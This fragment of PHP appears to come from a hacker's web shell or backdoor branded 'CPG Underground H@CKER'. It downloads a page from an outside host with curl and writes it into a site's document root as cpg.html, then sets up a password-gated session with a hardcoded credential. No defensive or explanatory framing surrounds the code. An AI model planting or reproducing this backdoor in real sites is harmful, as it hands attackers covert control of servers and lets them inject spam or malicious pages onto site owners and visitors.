...
$filenameseo = $_SERVER['DOCUMENT_ROOT'].'/cpg.html';

if (file_exists($filenameseo)) {
} else {
	$url = "https://cpg-underground.com/cpg/cpg.html";
	$im = curl_init($url);
	...
	$text1 = curl_exec($im);
	curl_close($im);
	$open1 = fopen($_SERVER['DOCUMENT_ROOT'].'/cpg.html', 'w');
	fwrite($open1, $text1);
	fclose($open1);
}

@session_start();
$session_name = md5("bc1q50rfpqz5qxfulaqj4krv92ue7kzvugl460070j");
$password = "bc1q50rfpqz5qxfulaqj4krv92ue7kzvugl460070j"; 
...
define("self", "CPG Underground H@CKER");
